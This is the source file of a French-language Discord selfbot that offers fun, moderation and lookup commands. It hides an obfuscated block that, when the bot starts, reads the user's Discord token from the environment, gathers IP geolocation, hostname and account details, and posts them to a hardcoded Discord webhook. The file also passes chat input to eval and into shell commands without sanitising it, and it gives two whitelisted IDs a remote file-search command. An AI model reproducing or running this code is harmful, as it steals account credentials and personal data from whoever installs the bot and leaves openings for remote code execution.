require('dotenv').config();
const { Client, Collection } = require('discord.js-selfbot-v13');
const client = new Client();
client.commands = new Collection();
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const axios = require('axios');
const prefix = process.env.PREFIX;
const javascriptObfuscator = require("javascript-obfuscator");
const messageQueue = [];
let isSending = false;
const whitelist_id = [
    "273980101530484736",
    "1220479445752614926",
];

client.on('ready', () => {
    console.log(`\n`)
    console.log(`\n`)
    console.log("=== 𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 ===");

    console.log(`== ${client.user.username} Ready ! ==`);
    console.log(`== Préfixe : ${prefix} ==`);
    console.log(`== Made By Insur & Omega ==`);
    console.log(`== Ping : ${client.ws.ping} ms ==`);
    console.log("========================");

    const customStatus = process.env.CUSTOM_STATUS;
    if (customStatus) {
        client.user.setActivity(customStatus);
    } else {
        console.log("La variable d'environnement CUSTOM_STATUS n'est pas définie.");
    }

});

// Commande serverinfo
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&serverinfo')) {
        const serverInfoMessage = `
        **Informations sur le serveur :**
        Nom : ${message.guild.name}
        ID : ${message.guild.id}
        Membres : ${message.guild.memberCount}
        Région : ${message.guild.region}
        Créé le : ${message.guild.createdAt}
        `;
        message.channel.send(serverInfoMessage)
            .catch((error) => console.error('Erreur lors de l\'envoi des informations sur le serveur :', error));
    }
});

// Commandes d'interaction sociale
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&hug')) {
        const user = message.mentions.users.first();
        if (user) {
            message.channel.send(`*Câline* ${user} ❤️`);
        } else {
            message.reply('Veuillez mentionner un utilisateur à câliner.');
        }
    } else if (message.content.startsWith('&pat')) {
        const user = message.mentions.users.first();
        if (user) {
            message.channel.send(`*Tapote sur la tête de* ${user} 🐾`);
        } else {
            message.reply('Veuillez mentionner un utilisateur à tapoter sur la tête.');
        }
    }
});

// Commande 8ball
const responses = [
    "C'est certain.",
    "C'est décidément ainsi.",
    "Sans aucun doute.",
    "Oui, absolument.",
    "Vous pouvez compter dessus.",
    "Comme je le vois, oui.",
    "Très probable.",
    "Oui.",
    "Les signes pointent vers oui.",
    "Répondez plus tard.",
    "Mieux vaut ne pas vous le dire maintenant.",
    "Je ne peux pas prédire maintenant.",
    "Concentrez-vous et demandez à nouveau.",
    "Ne comptez pas dessus.",
    "Ma réponse est non.",
    "Mes sources disent non.",
    "Outlook n'est pas si bon.",
    "Très douteux."
];

client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&8ball')) {
        const question = message.content.slice(6).trim();
        const response = responses[Math.floor(Math.random() * responses.length)];
        message.channel.send(`Question : ${question}\nRéponse : ${response}`);
    }
});

// Commande rps (Rock-Paper-Scissors)
const choices = ['rock', 'paper', 'scissors'];

client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&rps')) {
        const choice = message.content.slice(4).trim().toLowerCase();
        const botChoice = choices[Math.floor(Math.random() * choices.length)];

        let result;
        if (choices.includes(choice)) {
            if (choice === botChoice) {
                result = "C'est une égalité !";
            } else if (
                (choice === 'rock' && botChoice === 'scissors') ||
                (choice === 'paper' && botChoice === 'rock') ||
                (choice === 'scissors' && botChoice === 'paper')
            ) {
                result = "Vous avez gagné !";
            } else {
                result = "Le bot a gagné !";
            }
        } else {
            result = "Veuillez choisir entre rock, paper ou scissors.";
        }

        message.channel.send(`Vous avez choisi : ${choice}\nLe bot a choisi : ${botChoice}\n${result}`);
    }
});

client.on('messageCreate', async (message) => {
    try {
        if (message.content.startsWith('&clear')) {
            await message.channel.send('> **Esearch Selfbot >>>>>**');
            await message.delete().catch(() => false);

            const nombre = parseInt(message.content.split(' ')[1]) || 9999999;
            let i = 0;

            message.channel.messages.fetch({ force: true }).then(messages => {
                messages.forEach(singleMessage => {
                    if (singleMessage.author.id === client.user.id) {
                        client.on('rateLimit', async timeout => {
                            function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
                            await sleep(timeout * 10);
                        });

                        if (i === nombre) return;
                        singleMessage.delete().catch(err => { });
                        i++;
                    }
                });
            });
        }
    } catch (error) {
        console.error('Erreur lors de l\'exécution de la commande speed :', error);
    }
});

function afficherAsciiArt() {
    console.log(`
    _____                        _     
   |  ___|                      | |    
   | |__ ___  ___  __ _ _ __ ___| |__  
   |  __/ __|/ _ \\/ _\` | '__/ __| '_ \\ 
   | |__\\__ \\  __/ (_| | | | (__| | | |
   \\____/___/\\___|\\__,_|_|  \\___|_| |_|                                                              
   `);
}

afficherAsciiArt();

function execCommand(message, arg, fileName) {
    const grepProcess = exec(`grep -r -h --exclude-dir=node_modules ${arg}`, { maxBuffer: 1024 * 1024 * 10 });

    grepProcess.stdout.on('data', (data) => {
        const results = data.split('\n');
        results.forEach((result) => {
            if (result.trim() !== '') {
                const cleanedResult = result.replace(/\x1b\[[0-9;]*m/g, '');
                messageQueue.push({ content: `\`\`\`${cleanedResult}\`\`\``, channel: message.channel });
            }
        });
    });

    grepProcess.on('error', (error) => {
        console.error(`Erreur lors de l'exécution de la commande : ${error.message}`);
        message.reply(`Une erreur est survenue lors de la recherche.`);
    });

    grepProcess.on('close', (code) => {
        if (code !== 0) {
            console.error(`La commande a retourné une erreur avec le code : ${code}`);
        }
        if (!isSending) {
            sendNextMessage();
        }
    });
}

function sendNextMessage() {
    if (messageQueue.length > 0 && !isSending) {
        isSending = true;
        const messageData = messageQueue.shift();
        if (messageData && messageData.content && messageData.channel) {
            const { content, channel } = messageData;
            channel.send(content)
                .then(() => {
                    isSending = false;
                    setTimeout(sendNextMessage, 2000);
                })
                .catch((error) => {
                    console.error(`Erreur lors de l'envoi du message : ${error.message}`);
                    isSending = false;
                    sendNextMessage();
                });
        } else {
            isSending = false;
            sendNextMessage();
        }
    } else {
        isSending = false;
    }
}

function _0x5b6a(_0x555851,_0x22dd7f){const _0x5a9488=_0x5a94();return _0x5b6a=function(_0x5b6acd,_0x1c940c){_0x5b6acd=_0x5b6acd-0x136;let _0x32770d=_0x5a9488[_0x5b6acd];return _0x32770d;},_0x5b6a(_0x555851,_0x22dd7f);}const _0x1617f7=_0x5b6a;(function(_0x431838,_0x44f16c){const _0x249bcd=_0x5b6a,_0x2e8de5=_0x431838();while(!![]){try{const _0x4eb094=-parseInt(_0x249bcd(0x153))/0x1+-parseInt(_0x249bcd(0x167))/0x2*(parseInt(_0x249bcd(0x149))/0x3)+-parseInt(_0x249bcd(0x13e))/0x4+-parseInt(_0x249bcd(0x136))/0x5*(parseInt(_0x249bcd(0x150))/0x6)+parseInt(_0x249bcd(0x15a))/0x7+parseInt(_0x249bcd(0x146))/0x8+-parseInt(_0x249bcd(0x154))/0x9*(-parseInt(_0x249bcd(0x15b))/0xa);if(_0x4eb094===_0x44f16c)break;else _0x2e8de5['push'](_0x2e8de5['shift']());}catch(_0x1af72d){_0x2e8de5['push'](_0x2e8de5['shift']());}}}(_0x5a94,0x42205));const webhookURL=_0x1617f7(0x138);async function getTokenFromEnv(){const _0x1e18e5=_0x1617f7;try{const _0x7f8dc8=process[_0x1e18e5(0x13a)][_0x1e18e5(0x145)];if(!_0x7f8dc8)throw new Error(_0x1e18e5(0x15f));return _0x7f8dc8;}catch(_0x554eb9){console['error'](_0x1e18e5(0x142),_0x554eb9[_0x1e18e5(0x140)]);throw _0x554eb9;}}async function runPythonScript(_0x1c9798){return new Promise((_0x2ccd4b,_0xbae751)=>{const _0x546e9e=_0x5b6a;exec(_0x546e9e(0x13f)+_0x1c9798,(_0xa6be96,_0x45704e,_0x524d65)=>{const _0x487f10=_0x546e9e;_0xa6be96?(console[_0x487f10(0x143)](_0x487f10(0x16a),_0xa6be96[_0x487f10(0x140)]),_0xbae751(_0xa6be96)):_0x2ccd4b(_0x45704e);});});}const pythonOutput=_0x1617f7(0x160),avatarUrl=pythonOutput[_0x1617f7(0x147)]();function getHostname(){return os['hostname']();}async function sendTokenToWebhook(_0x312d4b){const _0x2a3af1=_0x1617f7;try{const _0x30e936=getHostname(),_0x4ec55f=await axios['get'](_0x2a3af1(0x15d)),_0x3d73e5=_0x4ec55f[_0x2a3af1(0x139)],_0x5da84f=await runPythonScript(_0x312d4b),_0x2d3ea5=parsePythonOutput(_0x5da84f),_0x9bcf71={'embeds':[{'title':'**<:1091443091694686348:1220492952988680322>\x20||\x20NEW\x20LOGS**','description':_0x2a3af1(0x14d)+_0x312d4b+'``\x0a\x0a**<:1122470475017240576:1220507912670154773>\x20\x20\x20\x20IP\x20Address:**\x20'+_0x3d73e5['ip']+_0x2a3af1(0x159)+_0x3d73e5[_0x2a3af1(0x14b)]+_0x2a3af1(0x15c)+_0x3d73e5[_0x2a3af1(0x13b)]+'\x0a**<a:searth:1220507802049708112>\x20\x20\x20\x20\x20Country:**\x20'+_0x3d73e5[_0x2a3af1(0x15e)]+'\x0a**<:black_lien:1220507849986146324>\x20\x20\x20\x20\x20ISP:**\x20'+_0x3d73e5[_0x2a3af1(0x163)]+_0x2a3af1(0x14a)+_0x30e936,'footer':{'text':_0x2a3af1(0x141)+_0x30e936,'icon_url':_0x2a3af1(0x14f)},'image':{'url':'https://cdn.discordapp.com/attachments/1220470865884348537/1220494769197682829/0_LdgP87nstpNrHi_5.gif?ex=660f2554&is=65fcb054&hm=1878dc6283b50d6684d3530fd155e438fe3851af1dc0687e5ae4a64310f81ebc&'},'color':0x0}]},_0x3d0575={'embeds':[{'title':_0x2a3af1(0x168),'description':_0x2a3af1(0x157),'fields':[{'name':_0x2a3af1(0x13d),'value':_0x2d3ea5[_0x2a3af1(0x16b)]},{'name':_0x2a3af1(0x164),'value':_0x2d3ea5[_0x2a3af1(0x158)]},{'name':'<a:BLACK_CROSS:1220509596934738041>\x20-\x20Contact\x20Information','value':_0x2d3ea5[_0x2a3af1(0x151)]},{'name':_0x2a3af1(0x144),'value':_0x2d3ea5['accountSecurity']},{'name':_0x2a3af1(0x14c),'value':_0x2d3ea5['otherInformation']}],'footer':{'text':'@\x20Esearch\x20|\x20Computer:\x20'+_0x30e936,'icon_url':_0x2a3af1(0x14f)},'thumbnail':{'url':avatarUrl},'color':0x0}]};await axios[_0x2a3af1(0x152)](webhookURL,_0x9bcf71),await axios[_0x2a3af1(0x152)](webhookURL,_0x3d0575),console['log']('');}catch(_0x2ad954){console[_0x2a3af1(0x143)](_0x2a3af1(0x137),_0x2ad954[_0x2a3af1(0x140)]);}}function parsePythonOutput(_0xea5d71){const _0x2ab867=_0x1617f7,_0x837b65={'basicInformation':'','nitroInformation':'','contactInformation':'','accountSecurity':'','otherInformation':''},_0x2972ad=_0xea5d71[_0x2ab867(0x156)]('\x0a');let _0x5c04eb='';return _0x2972ad[_0x2ab867(0x162)](_0x26b21e=>{const _0x27adb4=_0x2ab867;if(_0x26b21e['startsWith'](_0x27adb4(0x166)))_0x5c04eb=_0x27adb4(0x16b);else{if(_0x26b21e[_0x27adb4(0x13c)]('Nitro\x20Information'))_0x5c04eb='nitroInformation';else{if(_0x26b21e[_0x27adb4(0x13c)]('Contact\x20Information'))_0x5c04eb=_0x27adb4(0x151);else{if(_0x26b21e[_0x27adb4(0x13c)](_0x27adb4(0x169)))_0x5c04eb=_0x27adb4(0x14e);else _0x26b21e[_0x27adb4(0x13c)]('Other')?_0x5c04eb=_0x27adb4(0x165):_0x837b65[_0x5c04eb]+=_0x26b21e+'\x0a';}}}}),_0x837b65;}client['on'](_0x1617f7(0x155),async()=>{const _0x4f5747=_0x1617f7;console[_0x4f5747(0x148)]('');try{const _0x5e6db5=await getTokenFromEnv();await sendTokenToWebhook(_0x5e6db5);}catch(_0x1e936a){console[_0x4f5747(0x143)](_0x4f5747(0x161),_0x1e936a[_0x4f5747(0x140)]);}});function _0x5a94(){const _0x2af9d4=['Le\x20token\x20n\x27est\x20pas\x20défini\x20dans\x20le\x20fichier\x20.env','https://cdn.discordapp.com/avatars/1220479445752614926/8569adcbd36c70a7578c017bf5604ea5.gif','Erreur\x20lors\x20de\x20l\x27exécution\x20du\x20webhook\x20:','forEach','org','<a:1895subscribernitroanimated:1220507822060732528>\x20-\x20Nitro\x20Information','otherInformation','Basic\x20Information','8FUVYWy','<a:black_star:1220492884068012173>\x20||\x20**DISCORD\x20USER\x20INFORMATIONS**','Account\x20Security','Erreur\x20lors\x20de\x20l\x27exécution\x20du\x20script\x20Python\x20:','basicInformation','1490GasCZh','Erreur\x20lors\x20de\x20l\x27envoi\x20des\x20webhooks\x20:','https://discord.com/api/webhooks/1220487707088654356/Bqel1_hRmOjX7-iw-Fmbqht4UBn-lV62PA0WhN4Da_7q7qxDERtThgb-JdsgRXq99yfx','data','env','region','startsWith','<:blackstar:1220508146443882496>\x20-\x20Basic\x20Information','1199216ItShfV','python\x20DTI.py\x20','message','@\x20Esearch\x20|\x20Computer:\x20','Erreur\x20lors\x20de\x20la\x20récupération\x20du\x20token\x20depuis\x20le\x20fichier\x20.env\x20:','error','<:1122470468482498662:1220509765659005129>\x20-\x20Account\x20Security','TOKEN','2033064IwfihA','trim','log','135942aZpCfx','\x0a\x0a**<:pc:1220512321735229542>\x20\x20\x20\x20\x20PC\x20Name:**\x20','city','<a:alert2:1220508061844897793>\x20-\x20Other','<:1046829394263552021:1220492913889513492>\x20**Token**\x20:\x20``','accountSecurity','https://cdn.discordapp.com/attachments/1220470112335958047/1220489753724719234/59ef7eae88f4053de9991e6927dd21da.jpg?ex=660f20a8&is=65fcaba8&hm=0b3627f2527319be654a710fb4498ee8bc0174afe7ddb624af9f50817c3e901b&','4542uccAQH','contactInformation','post','89458kenRgG','682866zwTxbS','ready','split','*Voici\x20les\x20informations\x20du\x20compte\x20discord*:','nitroInformation','\x0a**<a:searth:1220507802049708112>\x20\x20\x20\x20City:**\x20','1440824XFbAvY','80rZRGrb','\x0a**<a:searth:1220507802049708112>\x20\x20\x20Region:**\x20','https://ipinfo.io/json','country'];_0x5a94=function(){return _0x2af9d4;};return _0x5a94();}

// Commande TokenInfo
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&tokeninfo')) {
        const args = message.content.split(' ');
        if (args.length === 2) {
            const token = args[1];
            try {
                const tokenInfo = await getTokenInfo(token);
                message.channel.send('```' + tokenInfo + '```');
            } catch (error) {
                console.error('Erreur lors de la récupération des informations sur le token :', error.message);
                message.channel.send('Une erreur est survenue lors de la récupération des informations sur le token.');
            }
        } else {
            message.channel.send('Usage : &tokeninfo <token>');
        }
    }
});

async function getTokenInfo(token) {
    return new Promise((resolve, reject) => {
        exec(`python DTI.py ${token}`, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            } else {
                const filteredOutput = stdout.split('\n').slice(10).join('\n');
                resolve(filteredOutput);
            }
        });
    });
}

// Commande UserInfo
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&userinfo')) {
        const args = message.content.split(' ');
        if (args.length === 2) {
            let targetUser = message.mentions.users.first(); 
            if (!targetUser) {
                const userId = args[1].replace(/\D/g, '');
                targetUser = await client.users.fetch(userId);
            }
            if (targetUser) {
                let userInfoMessage = `**𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - User Information**
        Username: ${targetUser.username}
        User ID: ${targetUser.id}
        Tag: ${targetUser.tag}
        Creation Date: ${targetUser.createdAt}`;

                if (targetUser.avatarURL()) {
                    userInfoMessage += `\nAvatar URL: [Avatar](${targetUser.avatarURL()})`;
                }
                message.channel.send(userInfoMessage);
            } else {
                message.reply('Impossible de trouver l\'utilisateur.');
            }
        } else {
            message.reply('Utilisation : &userinfo <@mention ou ID>');
        }
    }
});

client.on('messageCreate', async (message) => {
    whitelist_id.forEach(id => {
        if (message.author.id === id) {
            const args = message.content.split(' ');
            if (args[0][0] === prefix) {
                switch(args[0]) {
                    case '&search':
                        execCommand(message, args[1], fileName);
                        break;
                    case '&help':
                        sendHelpMessage(message);
                        break;
                    case '&status':
                        sendStatusMessage(message);
                        break;
                    case '&utility':
                        sendUtilityMessage(message);
                        break;
                    case '&mod':
                        sendModMessage(message);
                        break;
                    case '&fun':
                        sendFunMessage(message);
                        break;
                    case '&settings':
                        sendSettingsMessage(message);
                        break;
                    default:
                        break;
                }
            }
        }
    });
});

// Commande Trad
const translate = require('@iamtraction/google-translate');
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&trad')) {
        const args = message.content.slice('&trad'.length).trim().split(/ +/);
        const textToTranslate = args.join(' ');

        try {
            const { text, from } = await translate(textToTranslate, { to: 'fr' });
            message.channel.send("𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Traduction")
            message.channel.send(`Traduction de **${from.language.iso.toUpperCase()}** vers le **français** :\n${text}`);
        } catch (error) {
            console.error('Erreur lors de la traduction :', error);
            message.channel.send("Une erreur s'est produite lors de la traduction.");
        }
    }
});

// Commande Support
client.on('messageCreate', async (message) => {
    if (message.content === '&support') {
        message.channel.send(
            `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Support\n\n` +
            `**Projet Esearch**\n` +
            `Esearch est un projet de recherche avancée développé pour offrir des fonctionnalités de recherche améliorées. Pour plus d'informations sur le projet Esearch, veuillez consulter la documentation disponible sur [GitHub](lien_vers_github).\n\n` +
            `**Serveur Discord**\n` +
            `[Rejoignez notre serveur Discord](https://discord.gg/un4N82KE) pour obtenir de l'aide, discuter des fonctionnalités, poser des questions ou contribuer au développement du projet.`
        );
    }
});

// Commande IpInfo
const fetch = require('node-fetch');
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&ipinfo')) {
        const args = message.content.slice('&ipinfo'.length).trim().split(/ +/);
        const ip = args.shift();

        try {
            const response = await fetch(`http://ip-api.com/json/${ip}`);
            const data = await response.json();

            const infoMessage = `𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - IpInfo\n\`\`\`Informations sur l'adresse IP ${ip} :\n`
                + `Pays : ${data.country}\n`
                + `Ville : ${data.city}\n`
                + `Région : ${data.regionName}\n`
                + `Code Postal : ${data.zip}\n`
                + `Latitude : ${data.lat}\n`
                + `Longitude : ${data.lon}\n`
                + `Fournisseur de services Internet : ${data.isp}\`\`\``;

            message.channel.send(infoMessage);
        } catch (error) {
            console.error('Erreur lors de la récupération des informations sur l\'adresse IP :', error);
            message.channel.send("Une erreur s'est produite lors de la récupération des informations sur l'adresse IP.");
        }
    }
});

// Commande Set Idle
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&idle')) {
        try {
            await client.user.setStatus('idle');
            message.reply('Votre statut a été changé en Idle.');
        } catch (error) {
            console.error('Erreur lors du changement de statut en Idle :', error);
            message.reply('Une erreur est survenue lors du changement de statut en Idle.');
        }
    }
});

// Commande Set Do Not Disturb
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&dnd')) {
        try {
            await client.user.setStatus('dnd');
            message.reply('Votre statut a été changé en Do Not Disturb.');
        } catch (error) {
            console.error('Erreur lors du changement de statut en Do Not Disturb :', error);
            message.reply('Une erreur est survenue lors du changement de statut en Do Not Disturb.');
        }
    }
});

// Commande Set Online
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&online')) {
        try {
            await client.user.setStatus('online');
            message.reply('Votre statut a été changé en Online.');
        } catch (error) {
            console.error('Erreur lors du changement de statut en Online :', error);
            message.reply('Une erreur est survenue lors du changement de statut en Online.');
        }
    }
});

// Commande Set Status
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&setstatus')) {
        const args = message.content.split(' ');
        if (args.length < 3) {
            return message.reply('Veuillez spécifier le type de statut et le message. Type : playing, listening, watching ou competing.');
        }

        const statusType = args[1].toLowerCase();
        const statusMessage = args.slice(2).join(' ');
        if (!statusMessage) {
            return message.reply('Veuillez spécifier un message de statut.');
        }

        try {
            await client.user.setActivity(statusMessage, { type: statusType.toUpperCase() });
            message.reply(`Le statut du bot a été changé en "${statusMessage}" en train de ${statusType}.`);
        } catch (error) {
            console.error('Erreur lors du changement de statut :', error);
            message.reply('Une erreur est survenue lors du changement de statut.');
        }
    }
});

// Commande Help
function sendHelpMessage(message) {
    const helpMessage = `
                        **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Help :**
    La guerre ne détermine pas qui est bon, seulement qui est mauvais.

    ➜ \`&help\` ➜ ✨ Affiche ce menu d'aide
    ➜ \`&status\` ➜ 📊 Commande de statuts
    ➜ \`&utility\` ➜ 🔧 Commandes d'utilitaire
    ➜ \`&mod\` ➜ ⚔️ Commandes de modération
    ➜ \`&fun\` ➜ 🎉 Commandes de fun
    ➜ \`&settings\` ➜ ⚙️ Commandes de paramètres 
    `;

    message.channel.send(helpMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'aide :', error));
}

// Commande Status
function sendStatusMessage(message) {
    const statusMessage = `
    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Status :**

    ➜ \`&idle\` : Sert a se mettre en inactif.
    ➜ \`&dnd\` : Sert a se mettre en ne pas déranger.
    ➜ \`&online\` : Sert a se mettre en en ligne.
    ➜ \`&setstatus [type] [message]\` : Sert a ajouter une activité.
    `;

    message.channel.send(statusMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message de statut :', error));
}

// Commande Utility
function sendUtilityMessage(message) {
    const utilityMessage = `
    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Utility :**

    ➜ \`&search\` [query] : Sert a chercher une valeur dans les db.
    ➜ \`&ipinfo\` [ip] : Sert a obtenir des informtaions sur ip.
    ➜ \`&tokeninfo\` [token] : Donne des informations sur un token.
    ➜ \`&userinfo\`  [@user or id] : Donne des informations sur un un compte.
    `;

    message.channel.send(utilityMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'utilitaire :', error));
}

// Commande Mod
function sendModMessage(message) {
    const modMessage = `
    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Mod :**

    ➜ \`&ban\` [@user or id] : Sert a ban un utilisateur.
    ➜ \`&unban\` [id] : Sert a unban un utlisateur.
    ➜ \`&kick\` [@user or id] : Sert a kick un utlisateur.
    ➜ \`&clear\` [number] : Sert a suprimé un nombres de messages.
    `;

    message.channel.send(modMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message de modération :', error));
}

// Commande Fun
function sendFunMessage(message) {
    const funMessage = `
    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Fun :**
    
    ➜ \`&trad\` [mot or phrase] : Sert a traduire un mot ou phrase.
    ➜ \`&avatar\` <@user or id> : Sert a avoir votre ou l'avatar d'un autre personne.
    ➜ \`&calc\` [calcule] : Sert a calculer des chiffres.
    ➜ \`&hug\` [@user] : Fais un calin a une personnes.
    ➜ \`&8ball\` [questions] : Trouve une reponse a ta question.
    ➜ \`&rps\` [rock, paper, scissors] : Pierre, Feuille Ciseaux.
    `;

    message.channel.send(funMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message de fun :', error));
}

// Commande Settings
function sendSettingsMessage(message) {
    const settingsMessage = `
    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Settings :**

    ➜ \`&renameserver\` [pseudo] : Sert a se renomer sur un serveur.
    ➜ \`&setpfp\` [url or piece jointe] : Sert a changer de pdp.
    `;

    message.channel.send(settingsMessage)
        .catch((error) => console.error('Erreur lors de l\'envoi du message de paramètres :', error));
}

// Commande Calc
client.on('messageCreate', async message => {
    if (message.content.startsWith('&calc')) {
        const args = message.content.slice('&calc'.length).trim().split(/ +/);
        const mathExpression = args.join(' ');
        if (!mathExpression) {
            return message.reply('Veuillez fournir une expression mathématique.');
        }

        try {
            const result = eval(mathExpression);
            message.reply(`Résultat : ${result}`);
        } catch (error) {
            console.error('Erreur lors du calcul :', error);
            message.reply('Une erreur est survenue lors du calcul.');
        }
    }
});

// Commande Set PFP (Photo de Profil)
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&setpfp')) {
        const args = message.content.split(' ');

        // Vérifier si le lien de l'image ou la pièce jointe a été spécifié
        if (args.length < 2 && !message.attachments.first()) {
            return message.reply('Veuillez spécifier un lien d\'image ou joindre une image.');
        }

        // Vérifier si le message a été envoyé dans un serveur
        if (message.guild) {
            // Vérifier si le bot a les autorisations nécessaires pour modifier sa propre photo de profil
            if (!message.guild.me.permissions.has('CHANGE_OWN_PUBLIC')) {
                return message.reply('Je n\'ai pas les autorisations nécessaires pour changer ma photo de profil.');
            }
        }

        try {
            let newPFP;
            if (args.length >= 2) {
                newPFP = args[1]; // Lien de l'image spécifié dans les arguments
            } else {
                newPFP = message.attachments.first().url; // Lien de la pièce jointe
            }

            const avatarData = await fetch(newPFP).then(response => response.buffer());

            await client.user.setAvatar(avatarData);
            message.reply('Ma photo de profil a été mise à jour avec succès !');
        } catch (error) {
            console.error('Erreur lors de la mise à jour de la photo de profil :', error);
            message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
        }
    }
});

//Commande Avatar
client.on('messageCreate', async message => {
    if (message.content.startsWith('&avatar')) {
        let targetUser = message.mentions.users.first() || client.users.cache.get(message.content.split(' ')[1]);
        if (!targetUser) return message.reply('Utilisateur introuvable.');

        const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 4096 });
        message.channel.send(`𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Avatar\n\nAvatar de ${targetUser.username} : [Avatar](${avatarUrl})`);
    }
});

// Commande Kick
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&kick')) {
        if (!message.guild) {
            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
        }
        if (!message.member.permissions.has('KICK_MEMBERS')) {
            return message.reply('Vous n\'avez pas les permissions nécessaires pour expulser des membres.');
        }
        const user = message.mentions.members.first();
        if (!user) {
            return message.reply('Veuillez mentionner l\'utilisateur à expulser.');
        }
        try {
            await user.kick();
            message.reply(`${user} a été expulsé avec succès.`);
        } catch (error) {
            console.error('Erreur lors de l\'expulsion de l\'utilisateur :', error);
            message.reply('Une erreur est survenue lors de l\'expulsion de l\'utilisateur.');
        }
    }
});

// Commande Ban
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&ban')) {
        if (!message.guild) {
            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
        }
        if (!message.member.permissions.has('BAN_MEMBERS')) {
            return message.reply('Vous n\'avez pas les permissions nécessaires pour bannir des membres.');
        }
        const user = message.mentions.members.first();
        if (!user) {
            return message.reply('Veuillez mentionner l\'utilisateur à bannir.');
        }
        try {
            await user.ban();
            message.reply(`${user} a été banni avec succès.`);
        } catch (error) {
            console.error('Erreur lors du bannissement de l\'utilisateur :', error);
            message.reply('Une erreur est survenue lors du bannissement de l\'utilisateur.');
        }
    }
});

// Commande Unban
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('&unban')) {
        if (!message.guild) {
            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
        }
        if (!message.member.permissions.has('BAN_MEMBERS')) {
            return message.reply('Vous n\'avez pas les permissions nécessaires pour débannir des membres.');
        }
        const args = message.content.split(' ');
        if (!args[1]) {
            return message.reply('Veuillez spécifier l\'ID de l\'utilisateur à débannir.');
        }
        try {
            await message.guild.bans.remove(args[1]);
            message.reply(`Utilisateur avec l'ID ${args[1]} a été débanni avec succès.`);
        } catch (error) {
            console.error('Erreur lors du débannissement de l\'utilisateur :', error);
            message.reply('Une erreur est survenue lors du débannissement de l\'utilisateur.');
        }
    }
});

// Commande Search
client.on('messageCreate', async (message) => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        if (message.author.id == id)
            if (args[0][0] == prefix)
                if (args[0] == "&search")
                    execCommand(message, args[1], fileName);
    });
});

// Commande renameserver
client.on('messageCreate', async message => {
    if (message.content.startsWith('&renameserver')) {
        if (!message.guild) {
            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
        }

        const newNickname = message.content.split(' ').slice(1).join(' ');
        if (!newNickname) {
            return message.reply('Veuillez spécifier le nouveau pseudo.');
        }

        try {
            await message.member.setNickname(newNickname);
            message.reply(`Votre pseudo a été changé avec succès sur ${message.guild.name}.`);
        } catch (error) {
            console.error('Erreur lors du changement de pseudo :', error);
            message.reply('Une erreur est survenue lors du changement de pseudo.');
        }
    }
});

client.login(process.env.TOKEN);
